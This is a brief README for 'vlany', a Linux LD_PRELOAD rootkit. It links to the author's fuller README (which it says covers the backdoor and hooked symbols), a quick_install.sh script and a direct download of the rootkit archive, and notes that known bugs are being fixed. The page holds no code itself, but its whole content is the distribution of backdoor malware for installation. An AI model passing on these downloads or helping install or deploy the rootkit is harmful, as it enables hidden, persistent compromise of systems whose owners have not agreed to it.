# vlany, Linux (LD_PRELOAD) rootkit
[Original README](https://raw.githubusercontent.com/mempodippy/vlany/master/README)</br>
The original README is much more full of information, diary entries, explanation of how elements of the rootkit works, backdoor information, hooked backdoor symbols, and much more.</br>
[vlany quick_install.sh script](https://gist.github.com/mempodippy/d93fd99164bace9e63752afb791a896b)</br>
[Direct link to vlany.tar.gz](https://github.com/mempodippy/vlany/raw/master/vlany.tar.gz)</br>
For those of you too lazy to read the original README, there are bugs in vlany as of currently. I *am* working on fixing these. A list of current bugs can be found in the original README @ 0x00000005.
